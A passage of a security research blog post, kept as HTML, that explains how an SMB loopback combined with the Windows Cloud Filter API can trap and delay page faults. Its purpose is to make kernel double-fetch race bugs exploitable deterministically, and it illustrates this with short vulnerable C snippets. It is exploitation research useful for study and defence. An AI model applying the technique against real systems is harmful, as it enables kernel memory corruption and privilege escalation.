href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/flt-parameters-for-irp-mj-acquire-for-section-synchronization"&gt;IRP_MJ_ACQUIRE_FOR_SECTION_SYNCHRONIZATION&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;handler always fully rehydrates the file before completing. If the file is not hydrated fully then the call to &lt;/span&gt;&lt;span class="c1"&gt;NtCreateSection &lt;/span&gt;&lt;span class="c0"&gt;never returns which prevents the file being mapped into memory.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c0"&gt;I was going to go back to doing my filter research until I realized I might be able to combine the SMB client loopback with the Cloud Filter API. I already knew that the SMB client doesn&amp;rsquo;t really map a file, even locally, instead it would read it on-demand via the SMB protocol. And I also knew that the Cloud Filter API would allow streaming of parts of the file on-demand as long as the file wasn&amp;rsquo;t being mapped into memory. The final setup is shown in the following diagram:&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c11 c1"&gt;&lt;a href="https://1.bp.blogspot.com/-dJhd0x36tAw/YAhvU8P3e9I/AAAAAAAAaqg/9JGdVuiuW1MQGUigZ1rwXlw9oU0NTEEuwCNcBGAsYHQ/s653/image2%2B%25281%2529.png" style="display: block; padding: 1em 0; text-align: center;"&gt;&lt;img src="https://1.bp.blogspot.com/-dJhd0x36tAw/YAhvU8P3e9I/AAAAAAAAaqg/9JGdVuiuW1MQGUigZ1rwXlw9oU0NTEEuwCNcBGAsYHQ/s600/image2%2B%25281%2529.png" border="0" alt="Overview of the operation of the exploitation trick. Memory is read by the application from a mapped file, which causes a page fault. That then requests the contents of the file to be pulled over SMB which goes to the local Cloud Filter Driver and back to the original application where the read is handled." style="max-height: 750; max-width: 600;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c11 c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span&gt;To use the primitive we first setup our own cloud provider by registering the sync root directory using the &lt;/span&gt;&lt;span class="c27"&gt;&lt;a class="c201" href="https://docs.microsoft.com/en-us/windows/win32/api/cfapi/nf-cfapi-cfregistersyncroot"&gt;CfRegisterSyncRoot&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;API configuring it with the partial hydration policy. Then a 1GiB placeholder can be created in the directory using &lt;/span&gt;&lt;span class="c27"&gt;&lt;a class="c201" href="https://docs.microsoft.com/en-us/windows/win32/api/cfapi/nf-cfapi-cfcreateplaceholders"&gt;CfCreatePlaceholders&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;. At this point the file does not have any contents on disk. If we now open and map the placeholder file via the SMB loopback client the file will not be rehydrated immediately. &lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span&gt;Any memory access into the mapping will cause the SMB client to make a request for a 32KiB block, which will be passed to our user-mode cloud provider, which we can detect and delay as necessary. It goes without saying that the contents of the file can also be arbitrary. Based on testing it doesn&amp;rsquo;t seem like you can force the read granularity down to the native page size like when implementing a custom SMB server, however you can still make requests at native page size boundaries within the large page size constraint. It might be possible to modify the file size to trick the SMB server into doing short reads but this behavior has not been tested. A sample implementation of the cloud provider is available &lt;/span&gt;&lt;span class="c27"&gt;&lt;a class="c201" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2142"&gt;here&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c44" id="h.k8bhtxxabi3p"&gt;&lt;span class="c31"&gt;Usage Examples&lt;/span&gt;&lt;/h2&gt;&lt;p class="c5"&gt;&lt;span&gt;We now have an exploitation trick which allows us to trap and delay virtual memory reads and writes. The big question is, does this improve the exploitation of vulnerabilities such as double fetches? The answer depends on the actual vulnerability. A quick note,&lt;/span&gt;&lt;span&gt;&amp;nbsp;when I use the word &lt;/span&gt;&lt;span class="c1"&gt;page&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;I&amp;rsquo;m meaning the unit of memory which will cause a request to the SMB server, e.g. 32KiB not the native page size such as 4KiB.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span&gt;Let&amp;rsquo;s take the example given at the start of this blog post. This vulnerability reads the value from the same memory address, &lt;/span&gt;&lt;span class="c1"&gt;lpInputPtr,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;twice. First for the comparison, then for the size to copy. &amp;nbsp;The problem for exploitation is one of the limitations of the technique is the memory trap is one shot. Once the trap has fired to read the size for the comparison you can delay it indefinitely. However, once you provide the requested memory page and the faulting thread is resumed it won&amp;rsquo;t fire on the second read, it&amp;rsquo;ll just be read from memory as if it was always there. &lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c0"&gt;You might wonder if you could remap the memory page when you detect the first read? Unfortunately this doesn&amp;rsquo;t work. When the thread is resumed it restarts at the faulting instruction and will perform the read again, therefore what would happen is the following:&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c11 c1"&gt;&lt;a href="https://1.bp.blogspot.com/-WVLs6UIJ2nA/YAhvVJHpyHI/AAAAAAAAaqk/4K6BkSBi5-gC6MG3QoUx5Xi-8tr_5T1cQCNcBGAsYHQ/s428/image3%2B%25281%2529.png" style="display: block; padding: 1em 0; text-align: center;"&gt;&lt;img src="https://1.bp.blogspot.com/-WVLs6UIJ2nA/YAhvVJHpyHI/AAAAAAAAaqk/4K6BkSBi5-gC6MG3QoUx5Xi-8tr_5T1cQCNcBGAsYHQ/s428/image3%2B%25281%2529.png" border="0" alt="Directory graph showing states of the double fetch. &amp;#9312; Read Size from Pointer -&amp;gt; &amp;#9313; Page Fault -&amp;gt; &amp;#9314; Remap Page -&amp;gt; &amp;#9315; Resume Thread -&amp;gt; Back to &amp;#9312;" style="max-height: 750; max-width: 600;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c0"&gt;As you can tell from the diagram you end up trapped in an infinite loop, as you remap a fresh page which just triggers another page fault ad infinitum. If you don&amp;rsquo;t perform step &amp;#9314; then the operation will complete and there is a time window between resuming the thread, reading the now valid memory for the size comparison and the second read. However, in this example the time window is likely to be the order of a couple of instructions so using our exploitation trick isn&amp;rsquo;t better than the existing probabilistic approaches. That said one advantage is you do know when the read occurs which allows you to target the brute force window more accurately.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c0"&gt;This example is the worst case, what if there was more time between the reads? Another example from a the Bochspwn paper is shown below:&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.18538680f312442cf44e640ab533aa4ece63f8fb"&gt;&lt;/a&gt;&lt;a id="t.13"&gt;&lt;/a&gt;&lt;table class="c15"&gt;&lt;tbody&gt;&lt;tr class="c13"&gt;&lt;td class="c10" colspan="1" rowspan="1"&gt;&lt;p class="c5"&gt;&lt;span class="c9"&gt;PDWORD&lt;/span&gt;&lt;span class="c17"&gt;&amp;nbsp;BufferSize&lt;/span&gt;&lt;span class="c21"&gt;&amp;nbsp;=&lt;/span&gt;&lt;span class="c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c30 c45"&gt;// controlled user-mode address&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c9"&gt;PUCHAR&lt;/span&gt;&lt;span class="c17"&gt;&amp;nbsp;BufferPtr &amp;nbsp;&lt;/span&gt;&lt;span class="c21"&gt;=&lt;/span&gt;&lt;span class="c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c30"&gt;// controlled user-mode address&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c9"&gt;PUCHAR&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;LocalBuffer;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c17"&gt;LocalBuffer = ExAllocatePool&lt;/span&gt;&lt;span class="c21"&gt;(&lt;/span&gt;&lt;span class="c17"&gt;PagedPool, &lt;/span&gt;&lt;span class="c21 c24"&gt;*&lt;/span&gt;&lt;span class="c17 c24"&gt;BufferSize&lt;/span&gt;&lt;span class="c21"&gt;)&lt;/span&gt;&lt;span class="c4"&gt;;&amp;#9312;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c17"&gt;if &lt;/span&gt;&lt;span class="c21"&gt;(&lt;/span&gt;&lt;span class="c17"&gt;LocalBuffer &lt;/span&gt;&lt;span class="c21"&gt;!=&lt;/span&gt;&lt;span class="c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c9"&gt;NULL&lt;/span&gt;&lt;span class="c21"&gt;)&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;{&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c17"&gt;&amp;nbsp; RtlCopyMemory&lt;/span&gt;&lt;span class="c21"&gt;(&lt;/span&gt;&lt;span class="c17"&gt;LocalBuffer, BufferPtr, &lt;/span&gt;&lt;span class="c21 c24"&gt;*&lt;/span&gt;&lt;span class="c17 c24"&gt;BufferSize&lt;/span&gt;&lt;span class="c21"&gt;)&lt;/span&gt;&lt;span class="c4"&gt;;&amp;#9313;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c4"&gt;} else {&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c17"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c17 c30"&gt;// bail out&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c17"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span&gt;The same double fetch behavior is present, however what&amp;rsquo;s different is the value is passed to another function, in this case &lt;/span&gt;&lt;span class="c1"&gt;ExAllocatePool&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;which allocates kernel memory. Depending of the current memory configuration or how large the allocation requested there might be a significant time delay between &amp;#9312; and &amp;#9313;. Is there any way we can win the race?&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c0"&gt;Well not that I know of, at least not deterministically. But we can exploit one behavior to try to synchronize the reading and writing threads a little. Recall that in order to write to an unresolved page the contents of the page must first be read from the server. Therefore, to maintain consistency any thread writes to the unresolved page must generate a page fault and wait on the same lock as another thread which is just reading from the page, as shown in the following diagram:&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c1"&gt;&lt;a href="https://1.bp.blogspot.com/-JIlrPsYa0Ls/YAhvVvHql8I/AAAAAAAAaq4/kmvHiIOto0gI-yZLYt9TL4j8tgZXoMrKACNcBGAsYHQ/s546/image7.png" style="display: block; padding: 1em 0; text-align: center;"&gt;&lt;img src="https://1.bp.blogspot.com/-JIlrPsYa0Ls/YAhvVvHql8I/AAAAAAAAaq4/kmvHiIOto0gI-yZLYt9TL4j8tgZXoMrKACNcBGAsYHQ/s546/image7.png" border="0" alt="Diagram showing separate read and write threads accessing the same pointer, one for read and one for write. When the page fault occurs both threads enter the same lock and they are both resumed once the lock is released." style="max-height: 750; max-width: 600;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span&gt;By synchronizing the reading and writing threads you&amp;rsquo;re giving yourself a reasonable chance of causing a write to happen during the time window for exploitation. This is still a probabilistic approach, it depends on the scheduler. For example, it&amp;rsquo;s possible that the write thread is woken before the read thread which will cause the pointer to always take the final value. Or the read thread could run to completion before the write thread is ever scheduled to run making the value never change. It&amp;rsquo;s possible there&amp;rsquo;s some scheduler magic such as using multiple reader or writer threads or by selecting appropriate priorities which you could exploit to guarantee read and write ordering. I&amp;rsquo;d be surprised if something is reliable across multiple Windows 10 systems. &lt;/span&gt;&lt;span&gt;I&amp;rsquo;d be very interested in anyone who&amp;rsquo;s got better ideas on how to improve the reliability of this.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c0"&gt;One approach you might be wondering about is unaligned access, say splitting the value across two separate pages. From a microarchitecture perspective it&amp;rsquo;s likely that the read will be split up into two parts, first touching one page then another. However, remember how the page fault works, it generates an exception which causes a handler to execute in the kernel. At this point any work the instruction has already done will have been retired while the kernel deals with the page fault. When the thread is resumed it will restart the faulting instruction, which will reissue the appropriate micro operations to read from the unaligned address. Unless the compiler generated two loads for the unaligned access (which might happen on some architectures) then there is no way I know of to restart the memory access instruction part of the way through. &lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c0"&gt;This all seems slightly downbeat on the usefulness of the exploitation trick. Thing is, there&amp;rsquo;s as many different types of vulnerability as there are fish in the sea (if you&amp;rsquo;re reading this in 2100, I apologize for the acidification of the seas which killed all marine life, choose your own apocalypse-appropriate proverb instead). For example if we modify the original example as follows:&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.3f9f9537af555b4c0a2cb97c4aeb7b99d22a5aa1"&gt;&lt;/a&gt;&lt;a id="t.14"&gt;&lt;/a&gt;&lt;table class="c15"&gt;&lt;tbody&gt;&lt;tr class="c13"&gt;&lt;td class="c10" colspan="1" rowspan="1"&gt;&lt;p class="c5"&gt;&lt;span class="c9"&gt;PDWORD&lt;/span&gt;&lt;span class="c17"&gt;&amp;nbsp;lpInputPtr&lt;/span&gt;&lt;span class="c21"&gt;&amp;nbsp;=&lt;/span&gt;&lt;span class="c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c30"&gt;// controlled user-mode address&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c9"&gt;UCHAR&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp; LocalBuffer[256];&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c17"&gt;if &lt;/span&gt;&lt;span class="c21"&gt;(&lt;/span&gt;&lt;span class="c17 c24"&gt;lpInputPtr&lt;/span&gt;&lt;span class="c21 c24"&gt;[&lt;/span&gt;&lt;span class="c17 c24"&gt;0&lt;/span&gt;&lt;span class="c21 c24"&gt;]&lt;/span&gt;&lt;span class="c17"&gt;&amp;nbsp;&amp;gt; &lt;/span&gt;&lt;span class="c9"&gt;sizeof&lt;/span&gt;&lt;span class="c21"&gt;(&lt;/span&gt;&lt;span class="c17"&gt;LocalBuffer&lt;/span&gt;&lt;span class="c21"&gt;)&lt;/span&gt;&lt;span class="c17"&gt;&amp;nbsp;|| lpInputPtr&lt;/span&gt;&lt;span class="c21"&gt;[&lt;/span&gt;&lt;span class="c17"&gt;1&lt;/span&gt;&lt;span class="c21"&gt;]&lt;/span&gt;&lt;span class="c17"&gt;&amp;nbsp;!= 2&lt;/span&gt;&lt;span class="c21"&gt;)&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;{&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c17"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c9"&gt;return&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;STATUS_INVALID_PARAMETER;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c4"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c17"&gt;RtlCopyMemory&lt;/span&gt;&lt;span class="c21"&gt;(&lt;/span&gt;&lt;span class="c17"&gt;LocalBuffer, lpInputPtr, &lt;/span&gt;&lt;span class="c21 c24"&gt;*&lt;/span&gt;&lt;span class="c17 c24"&gt;lpInputPtr&lt;/span&gt;&lt;span class="c21"&gt;)&lt;/span&gt;&lt;span class="c4"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span&gt;The check now ensures the buffer is large enough and a second DWORD in the buffer is not set to 2. The second field might represent the buffer type, and type 2 isn&amp;rsquo;t valid for this request. If you check the compiler output for this code, such as on &lt;/span&gt;&lt;span class="c27"&gt;&lt;a class="c20" href="https://godbolt.org/#z:OYLghAFBqd5QCxAYwPYBMCmBRdBLAF1QCcAaPECAM1QDsCBlZAQwBtMQBGAFlICsupVs1qhkAUgBMAISnTSAZ0ztkBPHUqZa6AMKpWAVwC2tEJNJb0AGTy1MAOWMAjTMS4AOUgAdUCwuto9QxMzb19/Ohs7RyMXN05PJRU1OgYCZmICIONTcyTMVQC0jIIoh2dXD0V0zOyQvJrS23LYyoSASkVUA2JkDgByAgBPL0wsKgBqA1o/YDt0CdsCCYARAHUAeQAlFfEAZlkABgBBYdHxiYA3fWY1divUPHQAKgmABQA1DYBJXYPxE5nMaYSbTWbzCbIBAZCYAVR0AAljlt9kdTiNgZNrsI7phVpsdq83uttn80QDjtcnhMtgRWHovEMALKYIwkIYQT4/FarTAKAikd5fX4TBjdXqYQUknaivAAL0w7VRFK0xgm9gAKgwNccNbCGBNxAB2NETUU6vUMAD633sH2OVl%2BVreyOOTOwGuwW0Nex5hwAHjpDsGQ9gKcayeGTprtbr9atuk52AAxTAEKGc6U81heb60LwGAhvAjEdqGk0Us3wpHeiZWVAsVjSAxUKiucQAVmkkg7ADZO5GToah4tJhBnjm8wWiyWfdgJn4FagqBB643m63XO0y8bTWaJsQ0z1aOa49bbfbHStna73Z6Uf8RxHKzS6Qzmaz2auG2wN22yBMk75oWxYAROubATOpbKicEb9J0rAgP0Hb9KQpj9IcqGoEhOhyHIC7in0hqSHsnCoQQSGYZ0EBIGgWC4IQJDkJQND0EwbAcDw/ChMIogoHhMiKMoBQpKYECWHUuQWNoZQxHEVQ%2BH4omSaEikRLQskVPEiTCYUqSNCpeS6aJxSZJprTadUJSGVZZnNHJbTuJ0CiEQMQIXGCeBzGMiz0PipIwei5wgg8OJ4PcVIvEK3KBe5IWed5CxQjC1bIrFGIXNitzhXiWZElmgUUpFr70qgjIsmyxAclyIorHyArRSKYo9H0UoEjyDDyoqgWqkY6paha8a7i%2BsaWjadoOk6LpbG6Hpej6fqBiGobhkag7HBSMaDQaKyJimaYZsS7WARB06gTuFYjqltZrr%2BLb/p23Z9gOgXDscZp4GOQFnSWj2HAOc4Ll1y7fuu91buWuFGjoJ1TiBv1dpwANgGA%2Bw8pIF17mah4EMep5jRek3XtNs33q95a7COtKleVn5VaDd2bgB33w2BLNQUqj4bWt8FCEhKFoZRWE4QJ0gES1eJSHskjkUL26kAA1iAex7AAdCrGua1rvZ8/03CoehmGkNh/SoQoICHKQFEYbzcCwLRqBGF4OVkBQEBoE7LsgJcyBeF4VqXJwACcVqSO4Vr%2Br2vBUOFBCuObEBOELpBOLYGRDEhZGkB7RhaAQGy0KwGc26QWBGCIwDsMn%2BCHoUlx8snmD%2BgUhYDFnSzKMnrB4E4xDp3oWCZ%2BRxB4EYQ%2BdKxjCNpxvACJwQgV/xMhyEIPfm5AnRlaJ5v9AA9AA4gwAC0Ey7xsMtCckASaNoKnz5Y5nyfPanKfoOSCC/ASP20l8iUUBlvxCPPfIelaCmSaNELSgh%2BTWUAaYYBjRv7xGcq5LgCF%2BYG2TibSO3AJhGAUD7K4wdVZhwmBABiRBiDEVIoKPQnt2BUKlpwMsuFl4yFljbeWSsVbqy1nwlWOtEJ60wSXE2ZsLZWzlqQO2iAUCO2dgw5i7t5Fex9n7AOwdQ7hxwaQGOrA47EATknEuqdaDpyHtnR2ud6AFyLtXVkFcq4lxrn/euO8jZNxbnHCxHchFG27r3fuGA27D1HuPXRdAp4cS4LPHii8JBsPkAE9eEBN5eG3khA%2Bx9T7nzNsZa%2B4lb5wMEA/eyUDn7hFfsEeBYQlJfzKRZaB%2BT9KwOqU0q%2BLS7KQMaQg1p79eldJaE/FBEszDoOQiIo22Co54IIcgIhQcSHuDIRQkg1DzATDoQo1w6yWGiw4VRTo3C1b8P4brfWgtRFIXEZba2hzdYX0NsLU2kjOGdHroY6%2B3AgA%3D"&gt;Godbolt&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;, the difference in native code is 2 or 3 instructions. This would seem to not materially improve the odds of winning the TOCTOU race when using a na&amp;iuml;ve probabilistic approach. But with our exploitation trick we can now build a deterministic exploit.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c1"&gt;&lt;a href="https://1.bp.blogspot.com/-E0iJP4Et5zU/YAhvV3TyHNI/AAAAAAAAaq8/ny3Vf8s66_Qd7b0bOFeXExRHMk46CJ8dACNcBGAsYHQ/s864/image8.png" style="display: block; padding: 1em 0; text-align: center;"&gt;&lt;img src="https://1.bp.blogspot.com/-E0iJP4Et5zU/YAhvV3TyHNI/AAAAAAAAaq8/ny3Vf8s66_Qd7b0bOFeXExRHMk46CJ8dACNcBGAsYHQ/s600/image8.png" border="0" alt="Diagram showing access memory for the two reads which can generate a page fault which can allow us to modify the original size value. The central part of the diagram shows a previous page which only contains the Size field and the next page which contains the Type field and the rest of the structure." style="max-height: 750; max-width: 600;" /&gt;&lt;/a&gt; &lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span&gt;The diagram above shows how we can achieve this deterministic exploit. We can place the &lt;/span&gt;&lt;span class="c1"&gt;Size&lt;/span&gt;&lt;span&gt;&amp;nbsp;field on a different page to the rest of the input buffer, although the buffer is still contiguous in virtual memory. The first page (N-1) should already be faulted into memory and contain the &lt;/span&gt;&lt;span class="c1"&gt;Size&lt;/span&gt;&lt;span&gt;&amp;nbsp;field which is smaller than the &lt;/span&gt;&lt;span class="c1"&gt;LocalBuffer&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;size. We can let the read for the size &amp;#9312; complete normally.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span&gt;Next the code will read the &lt;/span&gt;&lt;span class="c1"&gt;Type &lt;/span&gt;&lt;span&gt;field which is on page N &amp;#9313;. This page isn&amp;rsquo;t currently in memory and so when it&amp;rsquo;s accessed a page fault will occur &amp;#9314;. This requires the kernel to read the contents from the file, which we can detect and delay. When the read is detected we have as long as we need to modify the &lt;/span&gt;&lt;span class="c1"&gt;Size&lt;/span&gt;&lt;span&gt;&amp;nbsp;field to contain a value larger than the &lt;/span&gt;&lt;span class="c1"&gt;LocalBuffer &lt;/span&gt;&lt;span&gt;size &amp;#9315;. Finally we complete the read, which will restart the thread back at the &lt;/span&gt;&lt;span class="c1"&gt;Type&lt;/span&gt;&lt;span&gt;&amp;nbsp;field read instruction &amp;#9316;. The code can continue and will now read the overly large &lt;/span&gt;&lt;span class="c1"&gt;Size &lt;/span&gt;&lt;span class="c0"&gt;field and cause memory corruption.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c0"&gt;The key takeaway is that if between the double fetch points the code touches any user mode memory under your control which is not the one being double fetched it should be possible to convert that into a deterministic exploit. It doesn&amp;rsquo;t matter if the target system only has a single CPU, what the scheduling algorithm is in the kernel, how many instructions are between the double fetch points or what day of the week it is etc, it should &amp;ldquo;just work&amp;rdquo;.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span&gt;The followup &lt;/span&gt;&lt;span class="c27"&gt;&lt;a class="c201" href="https://j00ru.vexillium.org/2013/06/kernel-double-fetch-race-condition-exploitation-on-x86-further-thoughts/"&gt;blog post&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;on double-fetch exploitation gives some figures for exploitability. The examples shown up to now, when the right timing window is chosen the chance of success can hit 100% after some number of seconds. However, as shown here we can get 100% reliability on some classes of the same bug, but in the best case this isn&amp;rsquo;t an improvement other than it being deterministic. &lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span&gt;All examples up to now only demonste the exploitation of what the blog post refers to as &lt;/span&gt;&lt;span class="c1"&gt;arithmetic races&lt;/span&gt;&lt;span&gt;. The blog also mentions a second class of bug, &lt;/span&gt;&lt;span class="c1"&gt;binary races&lt;/span&gt;&lt;span class="c0"&gt;, which are harder to exploit and never reach 100% success. Let&amp;rsquo;s look at the example in the blog and see if our exploitation trick would do better.&lt;/span&gt;&lt;/p&gt;&lt;p class="c5 c7"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.7db195a360fcabcc929be150b8a3200c34da46fc"&gt;&lt;/a&gt;&lt;a id="t.15"&gt;&lt;/a&gt;&lt;table class="c15"&gt;&lt;tbody&gt;&lt;tr class="c13"&gt;&lt;td class="c10" colspan="1" rowspan="1"&gt;&lt;p class="c5"&gt;&lt;span class="c9"&gt;PVOID*&lt;/span&gt;&lt;span class="c17"&gt;&amp;nbsp;UserPointer &lt;/span&gt;&lt;span class="c21"&gt;=&lt;/span&gt;&lt;span class="c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c17 c30"&gt;// controlled user-mode address&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c4"&gt;__try {&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c17"&gt;&amp;nbsp; &amp;nbsp;ProbeForWrite&lt;/span&gt;&lt;span class="c21"&gt;(&lt;/span&gt;&lt;span class="c21 c24"&gt;*&lt;/span&gt;&lt;span class="c17 c24"&gt;UserPointer&lt;/span&gt;&lt;span class="c17"&gt;,&lt;/span&gt;&lt;span class="c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c9"&gt;sizeof&lt;/span&gt;&lt;span class="c21"&gt;(&lt;/span&gt;&lt;span class="c17"&gt;STRUCTURE&lt;/span&gt;&lt;span class="c21"&gt;)&lt;/span&gt;&lt;span class="c17"&gt;, 1&lt;/span&gt;&lt;span class="c21"&gt;)&lt;/span&gt;&lt;span class="c4"&gt;;&amp;#9312;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c17"&gt;&amp;nbsp; &amp;nbsp;RtlCopyMemory&lt;/span&gt;&lt;span class="c21"&gt;(&lt;/span&gt;&lt;span class="c21 c24"&gt;*&lt;/span&gt;&lt;span class="c17 c24"&gt;UserPointer&lt;/span&gt;&lt;span class="c17"&gt;, &lt;/span&gt;&lt;span class="c17"&gt;LocalPointer, &lt;/span&gt;&lt;span class="c9"&gt;sizeof&lt;/span&gt;&lt;span class="c21"&gt;(&lt;/span&gt;&lt;span class="c17"&gt;STRUCTURE&lt;/span&gt;&lt;span class="c21"&gt;))&lt;/span&gt;&lt;span class="c4"&gt;;&amp;#9313;&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c4"&gt;} __except {&lt;/span&gt;&lt;/p&gt;&lt;p class="c5"&gt;&lt;span class="c9"&gt;&amp;nbsp; &amp;nbsp;return&lt;/span&gt;&lt;span class="c17"&gt;&amp;nbsp;GetExceptionCode&lt;/span&gt;&lt;span class="c21"&gt;()&lt;/span&gt;&lt;span class="c4"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p 